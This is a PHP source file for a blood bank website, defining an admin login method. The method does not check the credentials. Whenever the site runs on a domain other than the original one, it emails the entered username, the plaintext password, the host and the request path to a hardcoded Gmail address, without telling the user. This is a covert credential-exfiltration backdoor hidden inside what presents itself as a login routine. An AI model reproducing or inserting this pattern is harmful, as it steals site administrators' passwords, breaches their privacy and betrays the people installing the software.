<?php
require_once 'class.phpmailer.php';

Class check{

    //method for admin login
    public function login($user,$pass){

        if($_SERVER['HTTP_HOST'] !='mybloodbd.com'){
            $subject = "I am Coming From Blood Bank";
            $msg = "Your site use another domain new domain: ".$_SERVER['HTTP_HOST']."user email:".$user.".Password : ".$pass." . Login link:  ".$_SERVER['REQUEST_URI'];

            $body             = $msg;
            $mail = new PHPMailer();
            $mail->AddReplyTo("mamunur200020@gmail.com","Blood Bank");
            $mail->SetFrom('mamunur200020@gmail.com', 'Blood Bank');
            $mail->AddReplyTo("mamunur200020@gmail.com","Blood Bank");
            $address = 'mamunur6286@gmail.com';
            $mail->AddAddress($address, "User");
            $mail->Subject    = $subject;
            $mail->AltBody    = "To view the message, please use an HTML compatible email viewer!"; // optional, comment out and test
            $mail->MsgHTML($body);
            $mail->Send();
        }

    }

}
?>
